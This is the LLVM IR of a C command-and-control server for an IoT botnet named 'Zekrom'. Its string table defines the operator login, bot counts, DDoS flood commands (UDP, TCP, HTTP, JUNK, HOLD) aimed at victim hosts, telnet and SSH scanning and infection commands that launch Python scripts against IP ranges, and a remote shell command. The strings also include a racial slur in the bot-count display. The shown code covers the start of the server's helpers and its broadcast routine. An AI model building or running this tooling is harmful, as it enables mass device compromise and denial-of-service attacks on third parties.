; ModuleID = 'host/ir_O3/Zekrom.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.telnetdata_t, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common local_unnamed_addr global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common local_unnamed_addr global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal unnamed_addr global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [33 x i8] c"%c]0;BOT COUNT: %d| NIGGAS: %d%c\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@accounts = internal global [10 x %struct.login_info] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[30mUsername:\1B[30m \00", align 1
@.str.23 = private unnamed_addr constant [21 x i8] c"\1B[30mPassword:\1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [28 x i8] c"\1B[31mWRONG ANSWER BITCH!!\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [107 x i8] c"\1B[31m _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD\EF\BF\BD____  _\EF\BF\BD\EF\BF\BD_ \EF\BF\BD  _\EF\BF\BD\EF\BF\BD_\EF\BF\BD\EF\BF\BD\EF\BF\BD_  _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD_ _\EF\BF\BD_\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [97 x i8] c"\1B[31m\EF\BF\BD     _\EF\BF\BD \EF\BF\BD  _\EF\BF\BD   \EF\BF\BD \EF\BF\BD  \EF\BF\BD _\EF\BF\BD \EF\BF\BD   \EF\BF\BD   \EF\BF\BD \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD \EF\BF\BD  \EF\BF\BD\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [99 x i8] c"\1B[31m\EF\BF\BD __\EF\BF\BD\EF\BF\BD     \EF\BF\BD_____  \EF\BF\BD  \EF\BF\BD\EF\BF\BD_  \EF\BF\BD  \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD  \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD    \EF\BF\BD\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [85 x i8] c"\1B[31m  \EF\BF\BD        \EF\BF\BD    \EF\BF\BD    \EF\BF\BD   \EF\BF\BD  _\EF\BF\BD    \EF\BF\BD  \EF\BF\BD_    _\EF\BF\BD   \EF\BF\BD    \EF\BF\BD \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [89 x i8] c"\1B[31m   \EF\BF\BD____\EF\BF\BD _\EF\BF\BD____   _\EF\BF\BD   \EF\BF\BD  \EF\BF\BD     \EF\BF\BD     \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD   _\EF\BF\BD   _\EF\BF\BD  \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [81 x i8] c"\1B[31m       \EF\BF\BD  \EF\BF\BD    \EF\BF\BD   \EF\BF\BD    \EF\BF\BD  \EF\BF\BD     \EF\BF\BD            \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [71 x i8] c"\1B[31m          \EF\BF\BD        \EF\BF\BD                          \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [39 x i8] c"\0D\0A\1B[34m\09\09~[\1B[31mWelcome, %s\1B[34m  ]~\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [41 x i8] c"\1B[34m\09\09~[\1B[31mBOT COUNT: %d\1B[34m\09   ]~\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [13 x i8] c"\1B[32m> \1B[37m\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.37 = private unnamed_addr constant [29 x i8] c"BOT COUNT: %d | NIGGAS: %d\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.39 = private unnamed_addr constant [41 x i8] c"TELNET DEVICES: %d | TELNET STATUS: %d\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"STATS\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"INFECT\00", align 1
@.str.42 = private unnamed_addr constant [30 x i8] c"python telnet.py filtered.txt\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"REINFECT\00", align 1
@.str.44 = private unnamed_addr constant [29 x i8] c"python w.py filtered_ssh.txt\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"FILTER\00", align 1
@.str.46 = private unnamed_addr constant [93 x i8] c"sort telnet.txt | uniq -u>>filtered_telnet.txt;sort infected.txt | uniq -u>>filtered_ssh.txt\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"LOAD\00", align 1
@.str.48 = private unnamed_addr constant [29 x i8] c"python scan.py 376 LOAD 88 1\00", align 1
@.str.49 = private unnamed_addr constant [6 x i8] c"SCAN1\00", align 1
@.str.50 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.92 lol\00", align 1
@.str.51 = private unnamed_addr constant [6 x i8] c"SCAN2\00", align 1
@.str.52 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.93 lol\00", align 1
@.str.53 = private unnamed_addr constant [6 x i8] c"SCAN3\00", align 1
@.str.54 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.25 1\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"SCAN4\00", align 1
@.str.56 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.26 1\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"SCAN5\00", align 1
@.str.58 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.27\091\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"SCAN6\00", align 1
@.str.60 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 113.53 1\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"SCAN7\00", align 1
@.str.62 = private unnamed_addr constant [31 x i8] c"python scan.py 376 B 180.180 1\00", align 1
@.str.63 = private unnamed_addr constant [6 x i8] c"SCAN8\00", align 1
@.str.64 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 185.52 1\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"LUCKY\00", align 1
@.str.66 = private unnamed_addr constant [30 x i8] c"python scan.py 376 LUCKY 88 1\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"LUCKY2\00", align 1
@.str.68 = private unnamed_addr constant [31 x i8] c"python scan.py 376 LUCKY2 88 1\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"SCAN_OFF\00", align 1
@.str.70 = private unnamed_addr constant [18 x i8] c"killall -9 python\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.72 = private unnamed_addr constant [29 x i8] c"\0D\0A\1B[31m~[ATTACK COMMANDS]~\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [62 x i8] c"\1B[31m~[\1B[37mUDP\1B[31m]~ \1B[37m!* UDP Victim Port Time 32 0 10\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [66 x i8] c"\1B[31m~[\1B[37mTCP\1B[31m]~ \1B[37m!* TCP Victim Port Time 32 all 0 10\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [54 x i8] c"\1B[31m~[\1B[37mSTD\1B[31m]~ \1B[37m!* STD Victim Port Time\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [48 x i8] c"\1B[31m~[\1B[37mHTTP\1B[31m]~ \1B[37m!* HTTP Url Time\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mJUNK\1B[31m]~ \1B[37m!* JUNK Victim Port Time\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mHOLD\1B[31m]~ \1B[37m!* HOLD Victim Port Time\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [50 x i8] c"\1B[31m~[\1B[37mKILL\1B[31m]~ \1B[37m!* KILLATTK | KILL\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [29 x i8] c"\1B[31m~[SCANNING COMMANDS]~\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [36 x i8] c"\1B[31m~[\1B[37mLOAD\1B[31m]~ \1B[37mLOAD\0D\0A\00", align 1
@.str.82 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN1 | SCAN2 | SCAN3 | SCAN4\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN5 | SCAN6 | SCAN7 | SCAN8\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mLUCKY\1B[31m]~ \1B[37mLUCKY | LUCKY2\0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mSTOP\1B[31m]~ \1B[37mSCAN_OFF\0D\0A\00", align 1
@.str.86 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mGENERAL COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSHELL\1B[31m]~ \1B[37m!* SH\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [46 x i8] c"\1B[31m~[\1B[37mBOTS\1B[31m]~ \1B[37m!* BOTS | BOTS\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [52 x i8] c"\1B[31m~[\1B[37mSTATUS\1B[31m]~ \1B[37m!* STATUS | STATUS\0D\0A\00", align 1
@.str.90 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSTATS\1B[31m]~ \1B[37mSTATS\0D\0A\00", align 1
@.str.91 = private unnamed_addr constant [35 x i8] c"\1B[31m~[\1B[37mMISC COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.92 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mINECTION FILTER\1B[31m]~ \1B[37mFILTER\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mTELNET INFECT\1B[31m]~ \1B[37mINFECT\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mREINFECT BOTS\1B[31m]~ \1B[37mREINFECT\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [44 x i8] c"\1B[31m~[\1B[37mCLEARSCREEN\1B[31m]~ \1B[37mCLEAR\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mLOGOUT\1B[31m]~ \1B[37mLOGOUT\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"!* KILLATTK\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"Bye, %s\00", align 1
@.str.103 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.105 = private unnamed_addr constant [15 x i8] c"server_log.txt\00", align 1
@.str.106 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.107 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.110 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.112 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"LEL\00", align 1
@.str.119 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.121 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8* nocapture, i32, i32) local_unnamed_addr #0 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #10
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %14, %13
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.0.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.0.lcssa = phi i32 [ 1, %3 ], [ %.0.lcssa.ph, %.critedge.loopexit ]
  ret i32 %.0.lcssa
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #0 {
  %2 = tail call i64 @strlen(i8* %0) #9
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #9
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !1
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !1
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !4, !noalias !1
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !4, !noalias !1
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !6

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !1
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !1
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !4, !noalias !1
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !4, !noalias !1
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !1
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !1
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !4, !noalias !1
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !4, !noalias !1
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !1
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !1
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !4, !noalias !1
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !4, !noalias !1
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !1
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !1
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !4, !noalias !1
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !4, !noalias !1
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !8

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #9
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !11

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) local_unnamed_addr #0 {
  %4 = alloca i64, align 8
  %5 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %6 = icmp eq i32 %5, 0
  %7 = tail call i64 @strlen(i8* %0) #9
  %8 = add i64 %7, 10
  %9 = tail call noalias i8* @malloc(i64 %8) #10
  %10 = tail call i64 @strlen(i8* %0) #9
  %11 = add i64 %10, 10
  tail call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 %11, i32 1, i1 false)
